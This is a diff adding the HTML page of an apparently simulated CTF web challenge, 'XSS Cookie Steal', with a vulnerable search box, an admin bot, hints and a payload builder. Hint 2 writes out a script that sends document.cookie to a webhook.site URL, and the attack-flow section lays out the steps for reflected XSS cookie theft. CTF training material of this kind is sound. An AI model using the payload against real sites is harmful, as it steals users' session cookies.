@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>XSS Cookie Steal — FlagVault CTF</title>
+  <link rel="stylesheet" href="styles.css" />
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🕷️</text></svg>" />
+</head>
+<body>
+
+  <!-- ═══════ NAV ═══════ -->
+  <nav class="nav">
+    <a href="#" class="nav-brand">
+      <span class="bracket">[</span><span class="brand-flag">FLAG</span>VAULT<span class="bracket">]</span>
+    </a>
+    <ul class="nav-links">
+      <li><a href="#">Challenges</a></li>
+      <li><a href="#" class="active">XSS</a></li>
+      <li><a href="#">Scoreboard</a></li>
+    </ul>
+    <div class="nav-status">
+      <div class="status-dot"></div>
+      ADMIN BOT ACTIVE
+    </div>
+  </nav>
+
+  <!-- ═══════ MAIN ═══════ -->
+  <div class="page-wrap">
+
+    <!-- Page Header -->
+    <header class="page-header" data-index="03">
+      <div class="page-eyebrow">WEB EXPLOITATION · CHALLENGE #03</div>
+      <h1 class="page-title">
+        <span class="hl2">XSS</span> — <span class="hl">Cookie</span> Steal
+      </h1>
+      <p class="page-desc">
+        A search box reflects your query back to the page without sanitisation.<br/>
+        Inject a script, steal the admin's cookie, and retrieve the flag.
+      </p>
+    </header>
+
+    <!-- Stats strip -->
+    <div class="stats-strip">
+      <div class="stat-box"><span class="stat-val">300</span><span class="stat-label">Points</span></div>
+      <div class="stat-box"><span class="stat-val red">Hard</span><span class="stat-label">Difficulty</span></div>
+      <div class="stat-box"><span class="stat-val amber">18</span><span class="stat-label">Solves</span></div>
+      <div class="stat-box"><span class="stat-val">Web</span><span class="stat-label">Category</span></div>
+    </div>
+
+    <!-- Three-panel layout -->
+    <div class="xss-layout">
+
+      <!-- ══ LEFT: Vulnerable Search App ══ -->
+      <div class="xss-left">
+        <div class="sec-divider"><h3>Target Application</h3></div>
+
+        <!-- Browser chrome -->
+        <div class="terminal-bar">
+          <span class="t-dot t-red"></span>
+          <span class="t-dot t-yellow"></span>
+          <span class="t-dot t-green"></span>
+          <span class="t-url" id="live-url">http://challenge.flagvault.local:8082/search</span>
+        </div>
+
+        <!-- Search App Window -->
+        <div class="app-window" id="app-search">
+          <div class="app-brand">
+            <span class="app-logo">🔍</span>
+            <div>
+              <div class="app-title">VaultSearch</div>
+              <div class="app-subtitle">Internal Knowledge Base — Search Portal v1.4</div>
+            </div>
+          </div>
+
+          <!-- Search bar -->
+          <div class="search-bar-wrap">
+            <input
+              class="search-input"
+              id="search-input"
+              type="text"
+              placeholder="Search the knowledge base..."
+              autocomplete="off"
+              oninput="updateUrlBar()"
+            />
+            <button class="btn btn-primary search-btn" onclick="doSearch()">
+              &gt;_ SEARCH
+            </button>
+          </div>
+
+          <!-- Reflected output zone -->
+          <div id="search-results-area" class="search-results-area hidden">
+            <div class="results-header">
+              <span class="q-label">// SEARCH RESULTS FOR:</span>
+              <span class="reflected-query" id="reflected-query"></span>
+            </div>
+            <div id="results-list" class="results-list"></div>
+          </div>
+
+          <!-- XSS Alert overlay -->
+          <div id="xss-alert-overlay" class="xss-alert-overlay hidden">
+            <div class="xss-alert-box">
+              <div class="xss-alert-icon">⚠️</div>
+              <div class="xss-alert-title">XSS Confirmed!</div>
+              <div class="xss-alert-msg" id="xss-alert-msg">alert(1) executed</div>
+              <button class="btn btn-danger" onclick="closeXSSAlert()" style="margin-top:1rem;font-size:0.65rem;padding:0.4rem 1rem;">Dismiss</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Admin Bot Panel -->
+        <div class="sec-divider"><h3>Admin Bot</h3></div>
+        <div class="admin-bot-panel">
+          <div class="bot-status-row">
+            <div class="bot-avatar">🤖</div>
+            <div class="bot-info">
+              <div class="bot-name">AdminBot v2.3</div>
+              <div class="bot-desc">Visits reported URLs every 30 seconds. Has <code>flag</code> cookie set in browser.</div>
+            </div>
+            <div class="bot-indicator">
+              <div class="bot-dot" id="bot-dot"></div>
+              <span id="bot-status-text" class="bot-status-text">IDLE</span>
+            </div>
+          </div>
+
+          <div class="bot-cookie-preview">
+            <span class="q-label">// ADMIN COOKIE (only visible to admin)</span>
+            <code class="cookie-redacted">flag=<span id="cookie-value-display">██████████████████████████████</span></code>
+          </div>
+
+          <div class="report-url-wrap">
+            <label class="form-label">Report malicious URL to Admin Bot</label>
+            <div class="report-row">
+              <input
+                class="form-control"
+                id="report-url"
+                type="text"
+                placeholder="http://challenge.flagvault.local:8082/search?q=<script>...</script>"
+                autocomplete="off"
+              />
+              <button class="btn btn-danger report-btn" onclick="submitToBot()">
+                🤖 REPORT
+              </button>
+            </div>
+            <div id="bot-result" class="bot-result hidden"></div>
+          </div>
+        </div>
+
+        <!-- Webhook Interceptor (simulated) -->
+        <div class="sec-divider"><h3>Webhook Interceptor <span class="tag tag-amber">Simulated</span></h3></div>
+        <div class="webhook-panel">
+          <div class="webhook-header-row">
+            <span class="q-label">// INCOMING REQUESTS — webhook.site/flagvault-sim</span>
+            <button class="btn-clear" onclick="clearWebhook()">Clear</button>
+          </div>
+          <div id="webhook-log" class="webhook-log">
+            <div class="webhook-empty">No requests received yet.<br/>Send the admin a URL containing your XSS payload...</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ══ RIGHT: Info + Hints + Submit ══ -->
+      <div class="xss-right">
+
+        <div class="sec-divider"><h3>Challenge Info</h3></div>
+        <div class="info-panel">
+          <div class="info-row"><span class="info-key">Target</span><code>:8082/search</code></div>
+          <div class="info-row"><span class="info-key">Vulnerability</span><span class="tag tag-red">XSS</span></div>
+          <div class="info-row"><span class="info-key">Type</span><span class="tag tag-amber">Cookie Theft</span></div>
+          <div class="info-row"><span class="info-key">Points</span><span style="color:var(--accent);font-family:var(--font-hud);">300</span></div>
+        </div>
+
+        <div class="sec-divider"><h3>Description</h3></div>
+        <div class="desc-block">
+          <p>The <code>/search</code> endpoint reflects your <code>q=</code> query parameter directly into the page HTML — no encoding, no sanitisation.</p>
+          <br/>
+          <p>An <strong>Admin Bot</strong> visits reported URLs every 30 seconds with the <code>flag</code> cookie set in its browser.</p>
+          <br/>
+          <p>Craft an XSS payload that exfiltrates <code>document.cookie</code> to a webhook, then report that URL to the bot.</p>
+        </div>
+
+        <div class="sec-divider"><h3>Hints</h3></div>
+        <div class="hints-list">
+
+          <div class="hint-card">
+            <div class="hint-header" onclick="toggleHint(1)">
+              <span>💡 HINT 1</span>
+              <span class="hint-cost tag tag-green">−25 pts</span>
+              <span class="hint-toggle" id="hint1-toggle">▼ Reveal</span>
+            </div>
+            <div class="hint-body hidden" id="hint1-body">
+              Confirm XSS first. Try this in the search box:<br/><br/>
+              <code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br/><br/>
+              If a popup appears, the page is vulnerable.
+            </div>
+          </div>
+
+          <div class="hint-card">
+            <div class="hint-header" onclick="toggleHint(2)">
+              <span>💡 HINT 2</span>
+              <span class="hint-cost tag tag-red">−50 pts</span>
+              <span class="hint-toggle" id="hint2-toggle">▼ Reveal</span>
+            </div>
+            <div class="hint-body hidden" id="hint2-body">
+              Use <code>document.cookie</code> to steal the cookie and send it to a webhook:<br/><br/>
+              <code>&lt;script&gt;fetch('https://webhook.site/YOUR-ID?c='+document.cookie)&lt;/script&gt;</code><br/><br/>
+              Replace <code>YOUR-ID</code> with your real webhook.site ID.
+            </div>
+          </div>
+
+          <div class="hint-card">
+            <div class="hint-header" onclick="toggleHint(3)">
+              <span>💡 HINT 3</span>
+              <span class="hint-cost tag tag-purple">−75 pts</span>
+              <span class="hint-toggle" id="hint3-toggle">▼ Reveal</span>
+            </div>
+            <div class="hint-body hidden" id="hint3-body">
+              URL-encode your full payload and submit it as the report URL.<br/><br/>
+              The bot will visit:<br/>
+              <code>/search?q=&lt;script&gt;fetch(...)&lt;/script&gt;</code><br/><br/>
+              It will execute the script in its browser context where <code>document.cookie</code> contains the flag.
+            </div>
+          </div>
+
+        </div>
+
+        <div class="sec-divider"><h3>Attack Flow</h3></div>
+        <div class="attack-flow">
+          <div class="flow-step">
+            <div class="flow-num">01</div>
+            <div class="flow-text">
+              <strong>Confirm XSS</strong><br/>
+              <span>Type <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in the search box → alert fires</span>
+            </div>
+          </div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step">
+            <div class="flow-num">02</div>
+            <div class="flow-text">
+              <strong>Get a Webhook</strong><br/>
+              <span>Go to <a href="https://webhook.site" target="_blank">webhook.site</a> → copy your unique URL</span>
+            </div>
+          </div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step">
+            <div class="flow-num">03</div>
+            <div class="flow-text">
+              <strong>Craft Payload URL</strong><br/>
+              <span>Build a search URL with a cookie-stealing <code>&lt;script&gt;</code> as the query</span>
+            </div>
+          </div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step">
+            <div class="flow-num">04</div>
+            <div class="flow-text">
+              <strong>Report to Admin Bot</strong><br/>
+              <span>Paste URL in the Report field → bot visits it → cookie leaked to webhook</span>
+            </div>
+          </div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step flow-step-flag">
+            <div class="flow-num" style="color:var(--accent);">🚩</div>
+            <div class="flow-text">
+              <strong>Grab the Flag</strong><br/>
+              <span>Read <code>flag=FlagVault{...}</code> from your webhook log</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="sec-divider"><h3>Submit Flag</h3></div>
+        <div class="flag-submit-panel">
+          <div class="form-group flag-input-wrap">
+            <span class="flag-prefix">FlagVault{</span>
+            <input class="form-control" id="flag-input" type="text" placeholder="your_flag_here" autocomplete="off"/>
+          </div>
+          <button class="btn btn-primary" onclick="submitFlag()" style="width:100%">&gt;_ SUBMIT FLAG</button>
+          <div class="submit-result" id="flag-result"></div>
+        </div>
+
+        <!-- Payload builder tool -->
+        <div class="sec-divider"><h3>Payload Builder <span class="tag tag-green">Tool</span></h3></div>
+        <div class="payload-builder">
+          <label class="form-label">Your Webhook URL</label>
+          <input class="form-control" id="webhook-input" type="text" placeholder="https://webhook.site/your-unique-id" oninput="buildPayload()" style="margin-bottom:0.8rem;" />
+          <label class="form-label">Generated Payload URL</label>
+          <div class="payload-output" id="payload-output">
+            <span style="color:var(--text-dim);">Enter your webhook URL above...</span>
+          </div>
+          <button class="btn btn-primary" onclick="copyPayload()" style="width:100%;margin-top:0.6rem;font-size:0.65rem;padding:0.5rem;">📋 Copy Payload URL</button>
+          <div id="payload-copy-toast" class="copy-toast hidden">✓ Copied!</div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div class="footer-brand">FLAG<span>VAULT</span> CTF</div>
+    <div class="footer-copy">Challenge #03 · Web Exploitation · Reflected XSS + Cookie Theft</div>
+  </footer>
+
+  <script src="script.js"></script>
+</body>
+</html>
